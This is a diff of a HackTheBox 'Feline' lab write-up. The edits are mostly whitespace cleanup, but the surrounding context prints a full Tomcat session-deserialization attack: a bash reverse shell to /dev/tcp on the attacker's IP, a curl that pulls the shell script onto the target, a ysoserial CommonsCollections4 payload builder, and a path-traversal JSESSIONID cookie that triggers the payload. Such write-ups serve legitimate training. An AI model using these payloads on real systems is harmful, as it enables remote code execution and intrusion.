@@ -50,15 +50,15 @@ tags: [Lab, HackTheBox]
    - find the upload page: /upload.jsp
    - find the upload path: /opt/samples/uploads
 
-7. create playload.sh 
+7. create playload.sh
    - bash -c "bash -i >& /dev/tcp/10.10.15.118(your ip)/2424 0>&1"
    - (reverse shell code)
- 
-8. create uploadfile.session 
+
+8. create uploadfile.session
    - curl http://10.10.15.118(your ip)/play1.sh -o /tmp/targetplay.sh
    - (upload the reverse shell code and store ie in /tmp/targetplay.sh)
 
-9. create executefile.session 
+9. create executefile.session
    - bash /tmp/targetplay.sh
    - (exccute the targetplay.sh)
 
@@ -233,7 +233,7 @@ CVE requirement:
 
 
 1. Tomcat uses the word `“Manager”` to describe the component that does session management.
-   - Sessions are used to preserve state between client requests,  
+   - Sessions are used to preserve state between client requests,
    - Tomcat provides two implementations that can be used:
      - `org.apache.catalina.session.StandardManager` (default)
        - keep sessions in memory.
@@ -324,7 +324,7 @@ curl http://10.10.10.205:8080/upload.jsp -H 'Cookis:JESSIONID=../../../tmp/execu
 
 
 
-```bash 
+```bash
 
 git clone https://github.com/frohoff/ysoserial.git
 
@@ -334,9 +334,9 @@ mvn clean package -DskipTests
 cd ysoserial/target/
 
 
-vim run.sh 
+vim run.sh
 ####################################################################################
-# Hackthebox "Feline" deserializtion attack 
+# Hackthebox "Feline" deserializtion attack
 #####################################################################################
 #set command line paramters
 ip=$1
@@ -352,10 +352,10 @@ hexout="bash -c {echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 "$hexout" > /tmp/$file.session
 echo $file
 
-#upload the payload 
+#upload the payload
 curl -s -F "data=@/tmp/$file.session" http://10.10.10.205:8080/upload.jsp?email=bob@bob.com > /dev/null
 
-#reference paylaod in cookie 
+#reference paylaod in cookie
 curl -s  -H "Cookie: JSESSIONID=../../../../../../../../../../opt/samples/uploads/$file" http://10.10.10.205:8080/ > /dev/null
 
 
